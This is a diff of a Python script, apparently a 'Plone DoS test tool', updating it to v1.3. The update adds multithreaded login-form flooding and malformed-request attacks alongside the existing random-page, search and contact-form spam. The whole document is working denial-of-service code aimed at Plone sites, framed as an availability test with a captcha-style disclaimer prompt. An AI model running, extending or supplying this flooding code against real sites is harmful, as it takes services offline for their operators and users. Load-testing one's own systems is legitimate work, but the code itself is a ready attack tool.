@@ -30,7 +30,7 @@ else:
     pass
 
 sw_name = "Plone DoS test tool"
-sw_version = "v1.2"
+sw_version = "v1.3"
 sw_banner = '\nThis is the ' + sw_name + ' ' + sw_version + ' - Availability does matter.\n' \
             'Use it to drown a Plone instance in non-cachable requests.\n' \
             '(C) 2016 until today: 0_o -- null_null (nu11.nu11[at]yahoo.com)\n\n' \
@@ -49,9 +49,10 @@ running = True
 
 
 class dos_nonexiting(threading.Thread):
-    def __init__(self, victim):
+    def __init__(self, victim, backoff_factor):
         threading.Thread.__init__(self)
         self.__running = True
+        self.__backoff = backoff_factor * random.random() / 100.0
         self.__victim = victim
         self.__randstr = threading.local()
         self.__req = threading.local()
@@ -65,14 +66,13 @@ class dos_nonexiting(threading.Thread):
         global threadLock
         s = threading.local()
         # Use a backoff sleep time to avoid all threads starting at once
-        time.sleep(random.random())
-        session = threading.local()
+        time.sleep(self.__backoff)
         session = requests.Session()
         while self.__running:
             self.__randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
             self.__req = self.__victim + '/' + self.__randstr
             try:
-                self.__r = session.get(self.__req, verify = False)
+                self.__r = session.get(self.__req, timeout = 10.0, verify = False)
                 self.__e = self.__r.status_code
                 self.__h = self.__r.headers
                 self.__c = self.__r.content
@@ -82,6 +82,10 @@ class dos_nonexiting(threading.Thread):
                 sys.stdout.write(s)
             except (requests.ConnectionError):
                 sys.stdout.write("E")
+            except (requests.HTTPError):
+                sys.stdout.write("H")
+            except (requests.Timeout):
+                sys.stdout.write("T")
         pass
     
     def stopme(self):
@@ -90,9 +94,10 @@ class dos_nonexiting(threading.Thread):
     
     
 class dos_search(threading.Thread):
-    def __init__(self, victim):
+    def __init__(self, victim, backoff_factor):
         threading.Thread.__init__(self)
         self.__running = True
+        self.__backoff = backoff_factor * random.random() / 100.0
         self.__victim = victim
         self.__randstr = threading.local()
         self.__req = threading.local()
@@ -106,14 +111,13 @@ class dos_search(threading.Thread):
         global threadLock
         s = threading.local()
         # Use a backoff sleep time to avoid all threads starting at once
-        time.sleep(random.random())
-        session = threading.local()
+        time.sleep(self.__backoff)
         session = requests.Session()
         while self.__running:
             self.__randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
             self.__req = self.__victim + '/@@search?SearchableText=' + self.__randstr
             try:
-                self.__r = session.get(self.__req, verify = False)
+                self.__r = session.get(self.__req, timeout = 10.0, verify = False)
                 self.__e = self.__r.status_code
                 self.__h = self.__r.headers
                 self.__c = self.__r.content
@@ -123,6 +127,10 @@ class dos_search(threading.Thread):
                 sys.stdout.write(s)
             except (requests.ConnectionError):
                 sys.stdout.write("E")
+            except (requests.HTTPError):
+                sys.stdout.write("H")
+            except (requests.Timeout):
+                sys.stdout.write("T")
         pass
     
     def stopme(self):
@@ -131,9 +139,10 @@ class dos_search(threading.Thread):
     
     
 class dos_contact(threading.Thread):
-    def __init__(self, victim):
+    def __init__(self, victim, backoff_factor):
         threading.Thread.__init__(self)
         self.__running = True
+        self.__backoff = backoff_factor * random.random() / 100.0
         self.__victim = victim
         self.__randstr = threading.local()
         self.__req = threading.local()
@@ -152,8 +161,7 @@ class dos_contact(threading.Thread):
         self.__headers = {'Referer': self.__req, 
                           'Content-Type': 'multipart/form-data; boundary=---------------------------29713827018367436031035745563'}
         # Use a backoff sleep time to avoid all threads starting at once
-        time.sleep(random.random())
-        session = threading.local()
+        time.sleep(self.__backoff)
         session = requests.Session()
         while self.__running:
             self.__randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
@@ -169,7 +177,7 @@ class dos_contact(threading.Thread):
                           'Content-Disposition: form-data; name=\"form.buttons.send\"\x0d\x0a\x0d\x0aSenden\x0d\x0a' \
                           '-----------------------------29713827018367436031035745563--\x0d\x0a'
             try:
-                self.__r = session.post(self.__req, headers=self.__headers, data=self.__data, verify = False)
+                self.__r = session.post(self.__req, headers=self.__headers, data = self.__data, timeout = 10.0, verify = False)
                 self.__e = self.__r.status_code
                 self.__h = self.__r.headers
                 self.__c = self.__r.content
@@ -179,6 +187,116 @@ class dos_contact(threading.Thread):
                 sys.stdout.write(s)
             except (requests.ConnectionError):
                 sys.stdout.write("E")
+            except (requests.HTTPError):
+                sys.stdout.write("H")
+            except (requests.Timeout):
+                sys.stdout.write("T")
+        pass
+    
+    def stopme(self):
+        self.__running = False
+        pass
+
+
+class dos_login(threading.Thread):
+    def __init__(self, victim, backoff_factor):
+        threading.Thread.__init__(self)
+        self.__running = True
+        self.__backoff = backoff_factor * random.random() / 100.0
+        self.__victim = victim
+        self.__randstr = threading.local()
+        self.__req = threading.local()
+        self.__data = threading.local()
+        self.__headers = threading.local()
+        self.__r = threading.local()
+        self.__e = threading.local()
+        self.__h = threading.local()
+        self.__c = threading.local()
+        pass
+
+    def run(self):
+        global threadLock
+        s = threading.local()
+        self.__req = self.__victim + '/login_form'
+        self.__headers = {'Referer': self.__victim + '/login', 
+                          'Content-Type': 'application/x-www-form-urlencoded'}
+        # Use a backoff sleep time to avoid all threads starting at once
+        time.sleep(self.__backoff)
+        session = requests.Session()
+        while self.__running:
+            self.__randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
+            self.__data = 'came_from=' + self.__victim + '%2F&next=&ajax_load=&ajax_include_head=&target=&mail_password_url=&' \
+                          'join_url=&form.submitted=1&js_enabled=0&cookies_enabled=&' \
+                          'login_name=&pwd_empty=0&__ac_name=' + self.__randstr + '&' \
+                          '__ac_password=' + self.__randstr + '&submit=Anmelden'
+            try:
+                self.__r = session.post(self.__req, data = self.__data, timeout = 10.0, verify = False)
+                self.__e = self.__r.status_code
+                self.__h = self.__r.headers
+                self.__c = self.__r.content
+                if self.__e >= 500: s = "5"
+                else: s = "."
+                # No need for thread safety here... Hrrhrrhrr :)
+                sys.stdout.write(s)
+            except (requests.ConnectionError):
+                sys.stdout.write("E")
+            except (requests.HTTPError):
+                sys.stdout.write("H")
+            except (requests.Timeout):
+                sys.stdout.write("T")
+        pass
+    
+    def stopme(self):
+        self.__running = False
+        pass
+
+
+class dos_login_malformed(threading.Thread):
+    def __init__(self, victim, backoff_factor):
+        threading.Thread.__init__(self)
+        self.__running = True
+        self.__backoff = backoff_factor * random.random() / 100.0
+        self.__victim = victim
+        self.__randstr = threading.local()
+        self.__req = threading.local()
+        self.__data = threading.local()
+        self.__headers = threading.local()
+        self.__r = threading.local()
+        self.__e = threading.local()
+        self.__h = threading.local()
+        self.__c = threading.local()
+        pass
+
+    def run(self):
+        global threadLock
+        s = threading.local()
+        self.__req = self.__victim + '/login_form'
+        self.__headers = {'Referer': self.__victim + '/login', 
+                          'Content-Type': 'application/x-www-form-urlencoded'}
+        # Use a backoff sleep time to avoid all threads starting at once
+        time.sleep(self.__backoff)
+        session = requests.Session()
+        while self.__running:
+            self.__randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
+            try:
+                self.__data = 'came_from=' + self.__victim + '%2F&next=&ajax_load=&ajax_include_head=&target=&mail_password_url=&' \
+                          'join_url=&form.submitted=1&js_enabled=0&cookies_enabled=&' \
+                          'login_name=&pwd_empty=0&__ac_name=' + self.__randstr + '&' \
+                          '__ac_password=' + self.__randstr + '&submit=Anmelden'
+                self.__r = session.get(self.__req + '?' + self.__data, timeout=10.0, verify = False)
+                self.__e = self.__r.status_code
+                self.__h = self.__r.headers
+                self.__c = self.__r.content
+                if self.__e >= 500: s = "5"
+                else: s = "."
+                # No need for thread safety here... Hrrhrrhrr :)
+                sys.stdout.write(s)
+            except (requests.ConnectionError):
+                sys.stdout.write("E")
+            except (requests.HTTPError):
+                sys.stdout.write("H")
+            except (requests.Timeout):
+                sys.stdout.write("T")
         pass
     
     def stopme(self):
@@ -198,7 +316,9 @@ def main():
     global sw_banner
     attacks = {0: dos_nonexiting,
                1: dos_search,
-               2: dos_contact}
+               2: dos_contact,
+               3: dos_login,
+               4: dos_login_malformed}
     attacks.update({len(attacks): None})
     # Make the script killable gracefully by SIGTERM and SIGABRT.
     signal.signal(signal.SIGTERM, stop_all)
@@ -206,16 +326,31 @@ def main():
     random.seed()
     print sw_banner
     argParser = argparse.ArgumentParser(formatter_class = argparse.ArgumentDefaultsHelpFormatter)
-    argParser.epilog = "While the program is running, one character will be printed out for each request. E: connection error, 5: HTTP status 5xx, .: all other HTTP status codes."
-    argParser.add_argument("-t", "--target", dest = "target", type = str, default = "https://localhost", required = True, help = "The target to test", metavar = "TARGET")
-    argParser.add_argument("-a", "--attack", dest = "attack", type = int, default = 3, required = False, help = "Different attacks. 0: GET random page, 1: spam search, 2: spam contact-info, 3: run all attacks at once", metavar = "ATTACK")
-    argParser.add_argument("-n", "--number", dest = "number", type = int, default = 1, required = False, help = "Start that many threads", metavar = "NUMBER")
+    argParser.epilog = "While the program is running, one character will be printed out for each request. " \
+                       "E: connection error, " \
+                       "T: request timeout, " \
+                       "H: invalid HTTP response, " \
+                       "5: HTTP status 5xx, " \
+                       ".: all other HTTP status codes."
+    argParser.add_argument("-t", "--target", dest = "target", type = str, default = "https://localhost", required = True, 
+                           help = "The target to test", metavar = "TARGET")
+    argParser.add_argument("-a", "--attack", dest = "attack", type = int, default = 0, required = False, 
+                           help = "Different attacks. 0: GET random page, " \
+                                                     "1: spam search, " \
+                                                     "2: spam contact-info, " \
+                                                     "3: spam login_form, " \
+                                                     "4: send malformed login_form, " \
+                                                     "5: run all attacks at once", 
+                           metavar = "ATTACK")
+    argParser.add_argument("-n", "--number", dest = "number", type = int, default = 1, required = False, 
+                           help = "Start that many threads", metavar = "NUMBER")
     argParser.add_argument("-v", "--version", action = "version", version = "1.0")
     args = argParser.parse_args(sys.argv[1:])
     my_captcha = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(3))
     try:
         print 'Run attack mode ' + str(args.attack) + ' against "' + args.target + '" with ' + str(args.number) + ' threads. Are you sure?\n'
-        user_answer = str(raw_input('In order to accept the WARNING, DISCLAIMER and license printed above,\nplease enter the captcha code (' + my_captcha + '): '))
+        user_answer = str(raw_input('In order to accept the WARNING, DISCLAIMER and license printed above,\n' \
+                                    'please enter the captcha code (' + my_captcha + '): '))
     except (KeyboardInterrupt, SystemExit):
         print "\n\nYou bailed out - Good Bye!\n"
         return
@@ -226,10 +361,10 @@ def main():
     for i in range(1, args.number + 1):
         if attacks.get(args.attack) is None:
             # OK, run all attack types at once.
-            t = attacks.get(random.randint(0, len(attacks) - 2))(args.target)
+            t = attacks.get(random.randint(0, len(attacks) - 2))(args.target, args.number)
         else:
             # Run one specified type of attack.
-            t = attacks.get(args.attack)(args.target)
+            t = attacks.get(args.attack)(args.target, args.number)
         threads.append(t)
         t.start()
     try:
@@ -238,6 +373,7 @@ def main():
             # Keep the console printing dots and numbers
             sys.stdout.flush()
     except (KeyboardInterrupt, SystemExit):
+        print "\n\nGot it - mob up and exit. Be patient now...\n"
         running = False
         stop_all()
     finally:
@@ -252,7 +388,7 @@ if __name__ == '__main__':
     try:
         main()
     except (KeyboardInterrupt):
-        print "\nBe p-a-t-i-e-n-t !!!"
+        print "\n\nBe p-a-t-i-e-n-t !!!   --   But if you cannot await it, another Ctrl+C will exit immediately.\n"
         pass
    
 # vim syntax=python ts=4 sw=4 sts=4 sr noet
